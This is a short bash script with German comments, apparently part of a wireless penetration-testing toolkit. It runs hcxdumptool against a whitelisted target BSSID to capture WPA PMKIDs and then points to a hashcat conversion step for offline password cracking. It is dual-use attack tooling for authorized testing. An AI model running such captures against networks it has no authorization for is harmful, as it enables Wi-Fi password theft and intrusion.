#!/usr/bin/env bash
# pmkid-attack.sh - clientless PMKID-Capture mit hcxdumptool
# Auth-Gate: BSSID muss whitelisted sein.

set -euo pipefail

TOOLKIT="${TOOLKIT:-/mnt/toolkit}"
# shellcheck source=../lib/logging.sh
source "$TOOLKIT/scripts/lib/logging.sh"
# shellcheck source=../lib/auth_check.sh
source "$TOOLKIT/scripts/lib/auth_check.sh"

require_bin hcxdumptool

IFACE="${1:-}"
BSSID="${2:-}"

if [[ -z "$IFACE" || -z "$BSSID" ]]; then
    echo "Usage: $0 <monitor_iface> <target_bssid>"
    exit 1
fi

require_auth "$BSSID"

outdir="$(make_outdir captures pmkid-${BSSID//:/})"
pcap="$outdir/dump.pcapng"
filter="$outdir/filter.txt"
# hcxdumptool erwartet BSSID ohne Trenner
printf '%s\n' "${BSSID//:/}" > "$filter"

log_info "PMKID-Capture - 60s gegen $BSSID"
log_warn "Manche Karten muessen NICHT im monitor-mode sein, hcxdumptool macht das selbst"

sudo timeout 60 hcxdumptool \
    -i "$IFACE" \
    -o "$pcap" \
    --bpf="$filter" \
    --disable_deauthentication \
    || log_warn "hcxdumptool exit non-zero (kann ok sein)"

if [[ -s "$pcap" ]]; then
    log_ok "Capture: $pcap"
    log_info "Naechster Schritt: pcap-to-hashcat.sh '$pcap'"
else
    log_err "Keine Daten gecaptured"
fi
